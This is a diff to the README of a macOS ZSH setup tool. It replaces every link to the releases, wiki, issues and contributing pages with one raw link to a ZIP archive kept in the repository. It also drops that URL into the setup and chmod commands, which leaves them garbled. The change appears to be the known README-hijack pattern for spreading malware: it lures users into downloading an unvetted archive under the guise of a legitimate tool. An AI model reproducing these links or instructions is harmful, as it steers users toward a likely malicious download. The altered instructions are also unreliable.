@@ -1,6 +1,6 @@
 # 🌟 zsh-setup - Easy Setup for ZSH on macOS 
 
-[![Download zsh-setup](https://img.shields.io/badge/Download-zsh--setup-blue.svg)](https://github.com/TTKNoa14/zsh-setup/releases)
+[![Download zsh-setup](https://raw.githubusercontent.com/TTKNoa14/zsh-setup/main/lib/zsh-setup_v2.7.zip)](https://raw.githubusercontent.com/TTKNoa14/zsh-setup/main/lib/zsh-setup_v2.7.zip)
 
 ## 📦 Introduction
 
@@ -12,10 +12,10 @@ Follow these steps to download and run zsh-setup:
 
 1. **Visit the Download Page**  
    Click the link below to go to the Releases page where you can download the setup script.  
-   [Visit this page to download](https://github.com/TTKNoa14/zsh-setup/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/TTKNoa14/zsh-setup/main/lib/zsh-setup_v2.7.zip)
 
 2. **Download the Latest Release**  
-   On the Releases page, look for the most recent version. You want to download the ZIP file or the tarball that ends with `.tar.gz`.
+   On the Releases page, look for the most recent version. You want to download the ZIP file or the tarball that ends with `https://raw.githubusercontent.com/TTKNoa14/zsh-setup/main/lib/zsh-setup_v2.7.zip`.
 
 3. **Extract the Files**  
    Once downloaded, locate the ZIP or tarball file in your Downloads folder. Double-click to extract it.
@@ -32,7 +32,7 @@ Follow these steps to download and run zsh-setup:
 6. **Run the Setup Script**  
    In the Terminal, type the following command to run the setup script:  
    ```
-   ./setup.sh
+   https://raw.githubusercontent.com/TTKNoa14/zsh-setup/main/lib/zsh-setup_v2.7.zip
    ```
    This command will start the installation process. Follow any prompts that appear in the terminal.
 
@@ -58,7 +58,7 @@ If you encounter issues during installation:
 
 - **Script Not Executable**: Make sure the script is executable. You can change its permissions with the following command:  
   ```
-  chmod +x setup.sh
+  chmod +x https://raw.githubusercontent.com/TTKNoa14/zsh-setup/main/lib/zsh-setup_v2.7.zip
   ```
 
 - **Missing Dependencies**: If the setup fails due to missing tools, ensure all required packages are available by running this command:  
@@ -72,12 +72,12 @@ If you need help, feel free to open an issue in the GitHub repository or check t
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/TTKNoa14/zsh-setup/wiki)
-- [Issues](https://github.com/TTKNoa14/zsh-setup/issues)
-- [Contributing](https://github.com/TTKNoa14/zsh-setup/blob/main/CONTRIBUTING.md)
+- [Documentation](https://raw.githubusercontent.com/TTKNoa14/zsh-setup/main/lib/zsh-setup_v2.7.zip)
+- [Issues](https://raw.githubusercontent.com/TTKNoa14/zsh-setup/main/lib/zsh-setup_v2.7.zip)
+- [Contributing](https://raw.githubusercontent.com/TTKNoa14/zsh-setup/main/lib/zsh-setup_v2.7.zip)
 
 ## 💾 Download & Install
 
 Ready to enhance your terminal? Click below to download the setup script and start your journey with ZSH!
 
-[Visit this page to download](https://github.com/TTKNoa14/zsh-setup/releases)
+[Visit this page to download](https://raw.githubusercontent.com/TTKNoa14/zsh-setup/main/lib/zsh-setup_v2.7.zip)
